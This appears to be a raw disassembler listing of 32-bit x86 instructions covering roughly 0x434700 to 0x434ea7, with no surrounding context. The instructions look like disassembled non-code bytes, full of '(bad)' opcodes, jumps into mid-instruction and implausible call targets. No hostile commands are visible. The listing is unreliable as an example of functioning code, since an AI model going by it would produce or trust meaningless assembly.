  4346f8:	adc    DWORD PTR [ebx-0x30],0xdce09858
  4346ff:	add    DWORD PTR [eax],eax
  434701:	pop    ebx
  434702:	push   ebp
  434703:	test   eax,0x1cc00e4
  434708:	push   esi
  434709:	xor    ecx,DWORD PTR [esi+ecx*2-0x3c161a7d]
  434710:	adc    al,0x0
  434712:	pop    edi
  434713:	call   0x2b3abc20
  434718:	iret   
  434719:	jne    0x43475e
  43471b:	pop    edx
  43471c:	or     eax,0x426bbc
  434721:	push   0xffffffc4
  434723:	pop    eax
  434724:	dec    ebx
  434725:	and    al,0x2d
  434727:	rcl    edi,0x43
  43472a:	mov    WORD PTR [ecx],?
  43472c:	mov    al,ds:0x73
  434731:	add    BYTE PTR [eax],al
  434733:	fadd   QWORD PTR [ecx]
  434735:	add    DWORD PTR [ebx-0x4c],0x26043b5c
  43473c:	xlat   BYTE PTR ds:[ebx]
  43473d:	push   eax
  43473e:	mov    DWORD PTR [edi],edx
  434740:	cli    
  434741:	cmp    BYTE PTR [eax],0xd5
  434744:	ins    DWORD PTR es:[edi],dx
  434745:	or     al,ch
  434747:	xor    al,0xf6
  434749:	(bad)  
  43474a:	jmp    edi
  43474c:	(bad)  
  43474d:	xor    esi,edi
  43474f:	mov    eax,ds:0x544584d9
  434754:	sar    BYTE PTR [ebx],0x48
  434757:	push   esp
  434758:	add    DWORD PTR [eax],eax
  43475a:	add    ch,ah
  43475c:	xor    bh,dh
  43475e:	(bad)  
  43475f:	(bad)  [edi+ecx*2]
  434762:	push   DWORD PTR [ebp-0x22]
  434765:	mov    ebp,0x82ebb6d9
  43476a:	les    ebp,FWORD PTR [ebp+0x20]
  43476d:	jns    0x434731
  43476f:	mov    ebx,0xb0e378fc
  434774:	test   eax,0x7f390010
  434779:	mov    eax,0xb81731cc
  43477e:	int3   
  43477f:	sub    DWORD PTR [edi],ebp
  434781:	mov    eax,0x7a9dc1cc
  434786:	in     al,dx
  434787:	(bad)  
  434788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434789:	icebp  
  43478a:	test   BYTE PTR [eax],dh
  43478c:	ror    DWORD PTR [ebp+0x66],cl
  43478f:	jne    0x434742
  434791:	std    
  434792:	gs jne 0x43480f
  434795:	aad    0x96
  434797:	add    BYTE PTR [eax],al
  434799:	add    BYTE PTR [eax],al
  43479b:	add    al,cl
  43479d:	sub    esp,ebp
  43479f:	pop    ebx
  4347a0:	mov    bh,0xd2
  4347a2:	std    
  4347a3:	retf   
  4347a4:	test   eax,0xc1ccb82e
  4347a9:	popf   
  4347aa:	jp     0x434798
  4347ac:	inc    esi
  4347ad:	xchg   esp,eax
  4347ae:	jp     0x43482b
  4347b0:	ins    DWORD PTR es:[edi],dx
  4347b1:	sub    al,0x4
  4347b3:	add    BYTE PTR [ebp-0x15],dh
  4347b6:	std    
  4347b7:	test   BYTE PTR [edi+0x75fffd2b],ch
  4347bd:	jmp    0x4347bc
  4347bf:	jg     0x434757
  4347c1:	out    0x46,eax
  4347c3:	shl    DWORD PTR [ebx-0x15],0xfd
  4347c7:	push   DWORD PTR [ebp+0x69]
  4347ca:	jmp    0x75ff:0xfdeb33ff
  4347d1:	jmp    0xa4c4bb20
  4347d6:	add    al,0x0
  4347d8:	jne    0x4347c3
  4347da:	jge    0x43479d
  4347dc:	jne    0x4347c6
  4347de:	std    
  4347df:	push   DWORD PTR [ebp+0x2]
  4347e2:	stos   BYTE PTR es:[edi],al
  4347e3:	add    DWORD PTR [edx],edi
  4347e5:	fsubr  st(7),st
  4347e7:	add    ecx,esi
  4347e9:	mov    edi,0x5671c599
  4347ee:	fld    st(2)
  4347f0:	and    bl,ah
  4347f2:	out    0x3,eax
  4347f4:	xor    eax,0x7506e7c4
  4347f9:	add    ah,bh
  4347fb:	dec    eax
  4347fc:	enter  0xa5d4,0xfb
  434800:	add    BYTE PTR [eax],al
  434802:	add    BYTE PTR [eax],al
  434804:	add    BYTE PTR [esi+0x75042a0e],al
  43480a:	add    ah,bh
  43480c:	ret    
  43480d:	mov    ah,0x2
  43480f:	in     eax,0x3
  434811:	jne    0x434815
  434813:	lods   al,BYTE PTR ds:[esi]
  434814:	(bad)  
  434815:	mov    cl,0xce
  434817:	xor    esi,DWORD PTR [edi-0x48d43157]
  43481d:	ror    esi,0xf6
  434820:	ret    
  434821:	neg    bl
  434823:	mov    bl,0x33
  434825:	inc    eax
  434826:	(bad)  [edx]
  434828:	outs   dx,DWORD PTR ds:[esi]
  434829:	nop
  43482a:	das    
  43482b:	mov    cl,0x5d
  43482d:	jge    0x43483e
  43482f:	cs pop ebp
  434831:	stos   BYTE PTR es:[edi],al
  434832:	xor    BYTE PTR [edx],cl
  434834:	adc    cl,ah
  434836:	mov    ebx,0xd2f003a6
  43483b:	mov    di,0x8581
  43483f:	stc    
  434840:	outs   dx,DWORD PTR ds:[esi]
  434841:	jns    0x434876
  434843:	jmp    0xf004:0x26ef710f
  43484a:	les    edi,FWORD PTR [ecx]
  43484c:	dec    ebp
  43484d:	xor    BYTE PTR [ecx+0x1bf20031],cl
  434853:	sub    DWORD PTR [ebp+0x20],ecx
  434856:	into   
  434857:	mov    bl,0xb8
  434859:	sub    esi,ecx
  43485b:	stos   DWORD PTR es:[edi],eax
  43485c:	mov    eax,0x1c00ce41
  434861:	enter  0x85ee,0x14
  434865:	imul   ebx,DWORD PTR [ebp-0x14],0xf9
  43486c:	add    BYTE PTR [eax],al
  43486e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43486f:	xor    DWORD PTR [ebx-0x74cddedc],ecx
  434875:	sbb    al,0x21
  434877:	xchg   DWORD PTR [ebx-0x6b],eax
  43487a:	stos   BYTE PTR es:[edi],al
  43487b:	inc    edi
  43487c:	cld    
  43487d:	mov    edx,0x7e2fea0d
  434882:	sbb    al,0xd9
  434884:	test   DWORD PTR [ecx*1-0x7c1a3ba2],esp
  43488b:	ret    
  43488c:	je     0x434894
  43488e:	js     0x4348cf
  434890:	cld    
  434891:	fs mov ecx,0x3a621855
  434897:	ficom  DWORD PTR [ecx-0x45]
  43489a:	popa   
  43489b:	das    
  43489c:	hlt    
  43489d:	fwait
  43489e:	pop    ecx
  43489f:	das    
  4348a0:	lock xchg esi,eax
  4348a2:	sub    BYTE PTR [edx],dh
  4348a4:	dec    edi
  4348a5:	ss jp  0x4348fa
  4348a8:	push   cs
  4348a9:	test   eax,0x11f88576
  4348ae:	inc    eax
  4348af:	fyl2xp1 
  4348b1:	push   ds
  4348b2:	cmp    al,0x38
  4348b4:	test   DWORD PTR [edx+esi*1],ecx
  4348b7:	popf   
  4348b8:	int3   
  4348b9:	sbb    eax,0x35cccddd
  4348be:	(bad)  
  4348c0:	int3   
  4348c1:	sub    eax,0x9ccccdcd
  4348c6:	or     esi,ebp
  4348c8:	dec    edi
  4348c9:	xchg   edi,eax
  4348ca:	add    DWORD PTR [edi+0xc],ecx
  4348cd:	sbb    dh,BYTE PTR [ecx+0xdd4382]
  4348d3:	add    BYTE PTR [eax],al
  4348d5:	add    BYTE PTR [eax],al
  4348d7:	repz aam 0x74
  4348da:	sbb    al,ch
  4348dc:	or     al,0x83
  4348de:	mov    al,ds:0x851fd2
  4348e3:	jns    0x4348d7
  4348e5:	dec    edi
  4348e6:	lea    ebx,[ecx-0x6674af16]
  4348ec:	out    dx,al
  4348ed:	dec    ecx
  4348ee:	push   eax
  4348ef:	pop    ebp
  4348f0:	jmp    0x4348ff
  4348f2:	jo     0x434931
  4348f4:	inc    esi
  4348f5:	add    BYTE PTR [ebp-0xef9724],al
  4348fb:	sub    DWORD PTR [esi],eax
  4348fd:	or     eax,DWORD PTR [eax+0xc]
  434900:	jg     0x4348fa
  434902:	sbb    DWORD PTR es:[eax],eax
  434905:	sub    eax,eax
  434907:	test   DWORD PTR [ebx+0x4],eax
  43490a:	mov    ebx,DWORD PTR [ecx-0x16]
  43490d:	push   esi
  43490e:	mov    edi,ecx
  434910:	inc    eax
  434911:	mov    ebx,0xcc9140cc
  434916:	int3   
  434917:	mov    al,ds:0x29cccc91
  43491c:	push   edi
  43491d:	in     al,dx
  43491e:	push   ecx
  43491f:	sub    dl,BYTE PTR [edi+0x6d]
  434922:	or     al,0xdf
  434924:	lds    eax,FWORD PTR [ecx-0x11a76fbb]
  43492a:	je     0x4348f9
  43492c:	push   esi
  43492d:	push   es
  43492e:	test   DWORD PTR [ebp-0x674dc97],edx
  434934:	or     DWORD PTR [eax-0x73],edx
  434937:	fabs   
  434939:	push   eax
  43493a:	mov    eax,DWORD PTR [eax]
  43493c:	add    BYTE PTR [eax],al
  43493e:	add    BYTE PTR [eax],al
  434940:	fprem1 
  434942:	dec    ecx
  434943:	push   eax
  434944:	fucomp st(2)
  434946:	or     eax,0x45be74
  43494b:	test   DWORD PTR [eax+ebp*2+0x10],ebx
  43494f:	jmp    FWORD PTR [ecx-0x73bff4fb]
  434955:	jle    0x43494f
  434957:	sbb    DWORD PTR es:[ebx+ebp*1],eax
  43495b:	shl    ch,0x18
  43495e:	add    al,0x8b
  434960:	jne    0x434988
  434962:	call   0x480137c1
  434967:	mov    ebp,0xccb88f29
  43496c:	inc    ecx
  43496d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43496e:	mov    eax,0x74f639cc
  434973:	in     al,dx
  434974:	not    BYTE PTR [esi-0xa11ae04]
  43497a:	not    DWORD PTR [eax+0x66]
  43497d:	js     0x4349fc
  43497f:	enter  0x6c2a,0xb6
  434983:	stc    
  434984:	pop    esi
  434985:	jo     0x4349f7
  434987:	inc    ebx
  434988:	out    dx,al
  434989:	shl    BYTE PTR [esi],1
  43498b:	leave  
  43498c:	mov    DWORD PTR [eax+0x25f9ff57],ebx
  434992:	call   0x7b3df3e7
  434997:	jnp    0x434996
  434999:	push   ecx
  43499a:	addr16 cld 
  43499c:	repnz int 0x9
  43499f:	push   cs
  4349a0:	xor    eax,0x437ceb
  4349a5:	add    BYTE PTR [eax],al
  4349a7:	add    BYTE PTR [eax],al
  4349a9:	(bad)  [ebx-0x14]
  4349ac:	stc    
  4349ad:	pusha  
  4349ae:	or     esi,DWORD PTR [ebp+0x3b]
  4349b1:	jne    0x43496f
  4349b3:	cmp    eax,0x7ef7ca00
  4349b8:	ror    BYTE PTR [ecx-0x46],0xe2
  4349bc:	shr    esp,1
  4349be:	test   al,0xf9
  4349c0:	pop    eax
  4349c1:	not    BYTE PTR [edx]
  4349c3:	loope  0x434a42
  4349c5:	mov    edi,0x988541ef
  4349ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4349cb:	mov    esi,0x75033085
  4349d0:	push   ebx
  4349d1:	xchg   ecx,eax
  4349d2:	ja     0x434a17
  4349d4:	test   DWORD PTR [eax-0x4e334193],edx
  4349da:	div    BYTE PTR [edi-0x4cfe5634]
  4349e0:	mov    bh,0x41
  4349e2:	(bad)  
  4349e3:	stos   DWORD PTR es:[edi],eax
  4349e4:	mov    bh,0x39
  4349e6:	(bad)  
  4349e7:	cmp    al,0x7b
  4349e9:	push   ecx
  4349ea:	xor    DWORD PTR [esi+0x70],ebx
  4349ed:	imul   edx,DWORD PTR [ebx],0xd83d8295
  4349f3:	fs in  eax,dx
  4349f5:	rol    DWORD PTR [esi+ebx*2],0xd
  4349f9:	clc    
  4349fa:	inc    ebp
  4349fb:	iret   
  4349fc:	adc    BYTE PTR [edx+0x3],0x1b
  434a00:	adc    BYTE PTR [edx-0x59c312b2],bh
  434a06:	adc    al,0x50
  434a08:	add    DWORD PTR [ebp+0x2],esi
  434a0b:	out    0xda,eax
  434a0d:	add    BYTE PTR [eax],al
  434a0f:	add    BYTE PTR [eax],al
  434a11:	add    BYTE PTR [edx-0x67],dh
  434a14:	call   0x8e45bf1c
  434a19:	add    DWORD PTR [eax-0x37],ebx
  434a1c:	ins    BYTE PTR es:[edi],dx
  434a1d:	ror    DWORD PTR [ecx-0x5184e7e0],1
  434a23:	bnd jae 0x434a66
  434a26:	mov    DWORD PTR [edx],esi
  434a28:	mov    eax,0xfaedec51
  434a2d:	adc    DWORD PTR ds:0xdceb6602,esi
  434a33:	dec    ebp
  434a34:	repnz out 0x66,al
  434a37:	add    dl,dh
  434a39:	inc    ebx
  434a3a:	jne    0x4349c5
  434a3c:	test   eax,0x2aca41ff
  434a41:	inc    ebp
  434a42:	push   ds
  434a43:	ret    
  434a44:	(bad)  
  434a45:	ret    
  434a46:	dec    edi
  434a47:	xor    eax,0xc6b9b726
  434a4c:	mov    esp,0xb230917a
  434a51:	jp     0x434a71
  434a53:	push   es
  434a54:	data16 mov ch,0x8c
  434a57:	jge    0x434a53
  434a59:	outs   dx,BYTE PTR ds:[esi]
  434a5a:	pusha  
  434a5b:	mov    eax,DWORD PTR [eax]
  434a5d:	out    dx,al
  434a5e:	cmc    
  434a5f:	ret    0xe074
  434a62:	fst    DWORD PTR es:[ebx]
  434a65:	cmc    
  434a66:	test   DWORD PTR [edx+0x0],eax
  434a69:	sbb    bl,BYTE PTR [ebx+0x31]
  434a6c:	jmpw   0x3dc9
  434a70:	mov    edi,0x7d02b4ae
  434a75:	lods   eax,DWORD PTR ds:[esi]
  434a76:	add    BYTE PTR [eax],al
  434a78:	add    BYTE PTR [eax],al
  434a7a:	add    BYTE PTR [ecx+0x3a],dl
  434a7d:	test   DWORD PTR [edi+0x1cbd3bb3],esp
  434a83:	mov    esp,0x3d1c85e6
  434a88:	push   esi
  434a89:	enter  0xb2a6,0xbf
  434a8d:	je     0x434a79
  434a8f:	lods   eax,DWORD PTR ds:[esi]
  434a90:	pop    ss
  434a91:	add    al,0x34
  434a93:	xor    al,0xc6
  434a95:	int3   
  434a96:	popf   
  434a97:	ffree  st(5)
  434a99:	int3   
  434a9a:	mov    ch,0xcd
  434a9c:	(bad)
  434a9f:	int    0xc5
  434aa1:	int3   
  434aa2:	sbb    al,0x7c
  434aa4:	out    0x85,al
  434aa6:	and    al,0xf9
  434aa8:	rol    DWORD PTR [eax],0x19
  434aab:	adc    BYTE PTR ds:0xfe312600,0x8f
  434ab2:	cld    
  434ab3:	xor    eax,0xdea9c102
  434ab8:	mov    dh,0x13
  434aba:	stos   BYTE PTR es:[edi],al
  434abb:	jbe    0x434a7e
  434abd:	inc    eax
  434abe:	in     eax,dx
  434abf:	xchg   ah,dh
  434ac1:	cmp    al,0xe9
  434ac3:	add    DWORD PTR [edx+0x10],eax
  434ac6:	mov    DWORD PTR [ebx+0x15],ebp
  434ac9:	add    BYTE PTR [esi],ch
  434acb:	cmp    esi,ebp
  434acd:	push   ebp
  434acf:	xor    eax,0x6ea9c102
  434ad4:	adc    dl,BYTE PTR [ecx]
  434ad6:	stos   BYTE PTR es:[edi],al
  434ad7:	jbe    0x434a9a
  434ad9:	inc    eax
  434ada:	add    BYTE PTR [eax+0x2],bl
  434ae0:	add    BYTE PTR [eax],al
  434ae2:	add    BYTE PTR [eax],al
  434ae4:	pushf  
  434ae5:	aas    
  434ae6:	mov    edx,0xcc8e8c04
  434aeb:	int3   
  434aec:	pop    eax
  434aed:	call   0xcccc:0x8e28cccc
  434af4:	sbb    BYTE PTR [esi+0x5b9fcccc],cl
  434afa:	push   edi
  434afb:	sbb    al,0xa2
  434afd:	xor    ebp,eax
  434aff:	jne    0x434b7a
  434b01:	(bad)  
  434b02:	dec    DWORD PTR [edx+0x4782f28f]
  434b08:	sbb    al,0x83
  434b0a:	les    eax,FWORD PTR [edi+eax*2]
  434b0d:	shr    BYTE PTR [esi+0x2],cl
  434b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434b11:	sar    DWORD PTR [ebp-0xa],1
  434b14:	xor    dh,0x82
  434b17:	inc    ebx
  434b18:	sbb    al,0x5b
  434b1a:	inc    edi
  434b1b:	or     al,0x62
  434b1d:	cs dec ecx
  434b1f:	call   0x438c14
  434b24:	sbb    eax,0xff010c67
  434b29:	icebp  
  434b2a:	clc    
  434b2b:	jbe    0x434b4d
  434b2d:	stc    
  434b2e:	outs   dx,BYTE PTR ds:[esi]
  434b2f:	adc    BYTE PTR [edi-0x6b],bl
  434b32:	or     al,0x29
  434b34:	iret   
  434b35:	add    eax,0x3257066d
  434b3a:	or     BYTE PTR [ecx+0x5b55f21f],cl
  434b40:	lahf   
  434b41:	(bad)  
  434b42:	int3   
  434b43:	int3   
  434b44:	cwde   
  434b45:	(bad)  
  434b46:	int3   
  434b47:	int3   
  434b48:	add    BYTE PTR [eax],al
  434b4a:	add    BYTE PTR [eax],al
  434b4c:	add    cl,ah
  434b4e:	pop    edx
  434b4f:	in     al,dx
  434b50:	push   esi
  434b51:	push   edi
  434b52:	or     BYTE PTR fs:[ebp-0x3d82316e],al
  434b59:	pushf  
  434b5a:	add    DWORD PTR [eax],eax
  434b5c:	mov    esi,DWORD PTR [ebp-0x5b]
  434b5f:	add    DWORD PTR [ebx-0x4e864b4b],eax
  434b65:	jne    0x434b52
  434b67:	std    
  434b68:	push   eax
  434b69:	inc    BYTE PTR [ebx-0x3e7d8307]
  434b6f:	imul   ebp,DWORD PTR [esi+esi*8],0x9a743be4
  434b76:	push   0x9e147dd
  434b7b:	cmp    ecx,0x7cff37be
  434b81:	pop    edx
  434b82:	cmp    al,0x58
  434b84:	sbb    dh,dh
  434b86:	mov    ebx,0x6a667453
  434b8b:	fst    QWORD PTR [esi+0x73fdeb77]
  434b91:	outs   dx,BYTE PTR ds:[esi]
  434b92:	add    al,0x9c
  434b94:	cli    
  434b95:	xor    bl,BYTE PTR [ebp+ebx*8+0x8a9c85a]
  434b9c:	add    dh,ch
  434b9e:	sub    cl,BYTE PTR [ebx+eax*4]
  434ba1:	xor    eax,0xc3850eef
  434ba6:	(bad)  
  434ba7:	sub    eax,0x2db3b385
  434bac:	stc    
  434bad:	and    al,0x68
  434baf:	enter  0x8,0x0
  434bb3:	add    BYTE PTR [eax],al
  434bb5:	add    dh,ch
  434bb7:	in     al,dx
  434bb8:	inc    DWORD PTR [edi+esi*1+0x61c088a7]
  434bbf:	out    0x8a,al
  434bc1:	dec    edx
  434bc2:	cdq    
  434bc3:	fwait
  434bc4:	mov    al,BYTE PTR [edx-0x73]
  434bc7:	fmulp  st(7),st
  434bca:	mul    BYTE PTR [esi]
  434bcc:	or     al,0x85
  434bce:	and    esi,DWORD PTR [edi+0x66353e8a]
  434bd4:	les    esi,FWORD PTR [eax+ebp*2+0x60]
  434bd8:	dec    esi
  434bd9:	and    al,0x45
  434bdb:	add    ch,BYTE PTR [esi+0x4a]
  434bde:	pop    ebp
  434bdf:	xor    bl,BYTE PTR [edx]
  434be1:	mov    ch,0x20
  434be3:	mov    esi,0xf6478edf
  434be8:	pop    ebp
  434be9:	inc    esi
  434bea:	dec    ebp
  434beb:	jg     0x434c14
  434bed:	pop    eax
  434bee:	jle    0x434b79
  434bf0:	test   eax,0xa9892527
  434bf5:	sub    esp,DWORD PTR ds:0x398718d5
  434bfb:	or     ebp,DWORD PTR [esi+0x39]
  434bfe:	mov    DWORD PTR [edi+0x44f82c21],eax
  434c04:	or     esi,DWORD PTR [esi]
  434c06:	(bad)
  434c09:	xchg   BYTE PTR [ecx],bh
  434c0b:	or     esi,esi
  434c0d:	ret    
  434c0e:	enter  0x38d3,0x13
  434c12:	out    0xc2,al
  434c14:	adc    cl,bl
  434c16:	mov    bh,0xf6
  434c18:	out    0x3,al
  434c1a:	add    BYTE PTR [eax],al
  434c1c:	add    BYTE PTR [eax],al
  434c1e:	add    BYTE PTR [ebp+0x2],dh
  434c21:	inc    ecx
  434c22:	dec    esp
  434c23:	test   al,0xe2
  434c25:	pushf  
  434c26:	inc    eax
  434c27:	jecxz  0x434c27
  434c29:	out    0x9b,al
  434c2b:	pop    ds
  434c2c:	aam    0x8a
  434c2e:	loop   0x434bdf
  434c30:	xor    eax,0xc67507a5
  434c35:	stos   DWORD PTR es:[edi],eax
  434c36:	iret   
  434c37:	xor    edi,eax
  434c39:	pop    esi
  434c3a:	dec    ecx
  434c3b:	jno    0x434c68
  434c3d:	pop    esi
  434c3e:	fld    TBYTE PTR [eax-0xffa2627]
  434c44:	fldenv [edx+eiz*8+0x66]
  434c48:	(bad)  
  434c49:	adc    eax,0xfebf3cc4
  434c4e:	retf   0x3cfa
  434c51:	jmp    0x434be1
  434c53:	ja     0x434c80
  434c55:	xchg   edi,eax
  434c56:	ss int 0xa5
  434c59:	add    BYTE PTR [ecx-0x607afd8a],ch
  434c5f:	mov    dl,0x7e
  434c61:	aas    
  434c62:	add    edx,esi
  434c64:	mov    esi,0xd3be6a0c
  434c69:	je     0x434c69
  434c6b:	jmp    0x434c9d
  434c6d:	xor    BYTE PTR [esi-0x3217bbb5],dh
  434c73:	push   esp
  434c74:	add    al,BYTE PTR [eax]
  434c76:	call   0xe1bf1fcf
  434c7b:	jmp    0x3fa57cc0
  434c80:	cmp    DWORD PTR [ebp+0x6a],edi
  434c86:	add    BYTE PTR [eax],al
  434c88:	dec    ecx
  434c89:	aam    0x74
  434c8b:	out    dx,eax
  434c8c:	icebp  
  434c8d:	aas    
  434c8e:	xor    BYTE PTR [esi],bh
  434c90:	mov    al,ds:0x9cf1e832
  434c95:	add    al,BYTE PTR [eax]
  434c97:	jo     0x434c58
  434c99:	adc    bh,bh
  434c9b:	(bad)  
  434c9c:	ja     0x434cf6
  434c9e:	or     BYTE PTR [edx+0x2c],ah
  434ca1:	cmp    DWORD PTR [ebp-0x3339ba63],edi
  434ca7:	mov    ch,0x45
  434ca9:	(bad)  
  434caa:	int3   
  434cab:	lods   eax,DWORD PTR ds:[esi]
  434cac:	inc    ebp
  434cad:	(bad)  
  434cae:	int3   
  434caf:	cmp    al,0xe8
  434cb1:	in     eax,0x4f
  434cb3:	cmp    al,BYTE PTR [eax]
  434cb5:	cmp    DWORD PTR [edi+ebx*1],ebp
  434cb8:	(bad)  
  434cb9:	ss cld 
  434cbb:	xchg   edx,eax
  434cbc:	jp     0x434d3b
  434cbe:	stc    
  434cbf:	bound  edi,QWORD PTR [edx]
  434cc1:	(bad)  
  434cc2:	test   esi,esi
  434cc4:	xchg   edx,eax
  434cc5:	sbb    eax,0x40f9dd71
  434cca:	ins    BYTE PTR es:[edi],dx
  434ccb:	jb     0x434d11
  434ccd:	mov    edi,DWORD PTR es:[ebp+0x68]
  434cd1:	int3   
  434cd2:	cli    
  434cd3:	dec    esi
  434cd4:	aam    0x1c
  434cd6:	lock add BYTE PTR [edi-0x44],dh
  434cda:	push   0x5d
  434cdc:	inc    edi
  434cdd:	dec    ecx
  434cde:	cmp    BYTE PTR [ebx+0x51],dl
  434ce1:	repnz pop ss
  434ce3:	push   ecx
  434ce4:	or     al,0xe7
  434ce6:	push   ds
  434ce7:	inc    eax
  434ce8:	pushf  
  434ce9:	inc    BYTE PTR [edx+0x57]
  434cef:	add    BYTE PTR [eax],al
  434cf1:	rol    BYTE PTR [ebp+0x41b5443f],1
  434cf7:	jo     0x434d22
  434cf9:	jecxz  0x434d5d
  434cfb:	jnp    0x434cc1
  434cfd:	and    BYTE PTR [edi],0x57
  434d00:	pop    esp
  434d01:	adc    edx,esi
  434d03:	dec    edi
  434d04:	nop
  434d05:	xchg   ebx,eax
  434d06:	jns    0x434d41
  434d08:	(bad)  
  434d09:	(bad)  
  434d0b:	cli    
  434d0c:	cmp    bl,BYTE PTR [edi]
  434d0e:	cmp    BYTE PTR [ebx+ebp*1],al
  434d11:	pandn  mm7,mm2
  434d14:	xor    cl,BYTE PTR [eax+eax*2]
  434d17:	pop    esi
  434d18:	mov    DWORD PTR [ebp+0x39],ebx
  434d1b:	loope  0x434ca8
  434d1d:	add    DWORD PTR [esi-0x7d],0xffffffd3
  434d21:	rol    DWORD PTR [ecx],1
  434d23:	push   ecx
  434d24:	nop
  434d25:	push   ebx
  434d26:	imul   edi,DWORD PTR [ecx],0xfffffffe
  434d29:	lahf   
  434d2a:	fdiv   st(2),st
  434d2c:	cmp    bl,bh
  434d2e:	aaa    
  434d2f:	add    al,0x2b
  434d31:	iret   
  434d32:	fdivp  st(2),st
  434d34:	xor    cl,ah
  434d36:	aas    
  434d37:	pop    esi
  434d38:	mov    DWORD PTR ds:0x8f03e139,ebx
  434d3e:	jle    0x434d3f
  434d40:	xor    BYTE PTR [edx+edi*8-0x1],0xe
  434d45:	mov    BYTE PTR [ebp+0x0],dh
  434d48:	add    ah,bl
  434d4a:	jle    0x434da3
  434d4c:	je     0x434d2d
  434d4e:	inc    edx
  434d4f:	ins    BYTE PTR es:[edi],dx
  434d50:	mov    edx,DWORD PTR [edx+0x385706]
  434d56:	add    BYTE PTR [eax],al
  434d58:	add    BYTE PTR [eax],al
  434d5a:	jne    0x434dc0
  434d5c:	int    0xe8
  434d5e:	fadd   QWORD PTR [ecx-0x20]
  434d61:	stc    
  434d62:	je     0x434d04
  434d64:	push   ecx
  434d65:	test   DWORD PTR [edx],edi
  434d67:	xchg   edi,eax
  434d68:	mov    WORD PTR [ecx-0x24dff],?
  434d6e:	add    BYTE PTR [eax-0x235082f9],bh
  434d74:	push   ebx
  434d75:	jae    0x434d65
  434d77:	cwde   
  434d78:	imul   eax,DWORD PTR [ebp+0x498cb33a],0x9b7c42d
  434d82:	ret    
  434d83:	fcomip st,st(4)
  434d85:	xchg   BYTE PTR [edx],bh
  434d87:	xchg   ebx,eax
  434d88:	mov    ah,0xe0
  434d8a:	push   0x11
  434d8c:	dec    ecx
  434d8d:	or     eax,0x1dbe8c74
  434d92:	mov    dl,0xf
  434d94:	mov    eax,DWORD PTR [ecx-0x53]
  434d97:	data16 shl BYTE PTR [ebp+eax*8+0x64],cl
  434d9c:	push   ecx
  434d9d:	dec    eax
  434d9e:	(bad)  
  434d9f:	out    dx,eax
  434da0:	cmp    eax,DWORD PTR [ebp-0x4df6fc4e]
  434da6:	mov    ecx,0x9a84ffab
  434dab:	sbb    ebp,DWORD PTR [ebp+0x47effee2]
  434db1:	sub    eax,0x5442bc33
  434db6:	out    dx,al
  434db7:	not    DWORD PTR [edi]
  434db9:	xchg   DWORD PTR [edx+0x856223],esi
  434dbf:	add    BYTE PTR [eax],al
  434dc1:	add    BYTE PTR [eax],al
  434dc3:	jns    0x434ddf
  434dc5:	sbb    eax,0x85293ee
  434dca:	ins    DWORD PTR es:[edi],dx
  434dcb:	out    dx,al
  434dcc:	pop    ds
  434dcd:	dec    esp
  434dce:	test   DWORD PTR [edx-0x76789de1],esi
  434dd4:	and    ebx,ecx
  434dd6:	mov    DWORD PTR [ecx],esp
  434dd8:	add    bh,cl
  434dda:	add    esi,DWORD PTR [ebp+0x7d]
  434ddd:	bound  ebx,QWORD PTR [eax-0x7518fd79]
  434de3:	cmp    al,0x56
  434de5:	out    0xcb,al
  434de7:	mov    eax,DWORD PTR [ebp+0x6530340]
  434ded:	les    eax,FWORD PTR fs:[esi-0x6e]
  434df1:	push   0xe808295f
  434df6:	add    esi,DWORD PTR [ebp+0x55]
  434df9:	repz mov al,BYTE PTR [ebp+eax*4+0x175079d]
  434e01:	ins    BYTE PTR es:[edi],dx
  434e02:	retf   
  434e03:	(bad)  
  434e04:	ror    BYTE PTR [edx],1
  434e06:	mov    esi,esp
  434e08:	rcr    ecx,0x3
  434e0b:	jne    0x434e8a
  434e0d:	stos   BYTE PTR es:[edi],al
  434e0e:	pop    ds
  434e0f:	inc    eax
  434e10:	ret    
  434e11:	jbe    0x434e79
  434e13:	clc    
  434e14:	push   edi
  434e15:	jae    0x434e19
  434e17:	in     al,0x5e
  434e19:	push   ds
  434e1a:	(bad)  
  434e1b:	shl    BYTE PTR [eax],1
  434e1d:	push   cs
  434e1e:	into   
  434e1f:	lock test eax,0x353da68
  434e25:	out    0x3,eax
  434e27:	add    BYTE PTR [eax],al
  434e29:	add    BYTE PTR [eax],al
  434e2b:	add    bh,al
  434e2d:	add    eax,0xd042017e
  434e32:	out    0x8a,eax
  434e34:	mov    ah,0xa
  434e36:	out    0xc5,al
  434e38:	shl    BYTE PTR [edx],0xbf
  434e3b:	push   es
  434e3c:	ins    BYTE PTR es:[edi],dx
  434e3d:	add    ah,bh
  434e3f:	cmp    BYTE PTR [ecx],0xfb
  434e42:	in     eax,0xbd
  434e44:	mov    edi,0x67c37279
  434e49:	add    ah,bh
  434e4b:	cmp    dh,al
  434e4d:	in     eax,0x24
  434e4f:	ret    
  434e50:	out    dx,al
  434e51:	js     0x434e38
  434e53:	add    al,0x75
  434e55:	add    al,BYTE PTR [eax]
  434e57:	mov    dl,0xb4
  434e59:	pop    ebp
  434e5a:	and    eax,edx
  434e5c:	(bad)  
  434e5d:	dec    edi
  434e5e:	ret    0x79eb
  434e61:	add    al,BYTE PTR [eax]
  434e63:	adc    ch,BYTE PTR [ecx+0x74dfef15]
  434e69:	test   edi,ebp
  434e6b:	bound  edi,QWORD PTR [ebx]
  434e6d:	or     bh,ch
  434e6f:	xor    BYTE PTR [eax+0x5819e83f],cl
  434e75:	add    al,BYTE PTR [eax]
  434e77:	push   0xffffffba
  434e79:	cli    
  434e7a:	(bad)  
  434e7b:	jne    0x434e33
  434e7d:	hlt    
  434e7e:	(bad)  
  434e7f:	call   0x4c883e4
  434e84:	xor    eax,0xffbccc8d
  434e89:	fimul  WORD PTR [edi-0x49]
  434e8c:	call   DWORD PTR [ebx+0x8]
  434e8f:	jb     0x434e91
  434e91:	add    BYTE PTR [eax],al
  434e93:	add    BYTE PTR [eax],al
  434e95:	cmp    dh,bh
  434e97:	jl     0x434ec2
  434e99:	lahf   
  434e9a:	xor    ecx,eax
  434e9c:	lods   al,BYTE PTR ds:[esi]
  434e9d:	push   edx
  434e9e:	leave  
  434e9f:	stc    
  434ea0:	jmp    0xe73c5a1b
  434ea5:	jns    0x434ea9
  434ea7:	ins    DWORD PTR es:[edi],dx
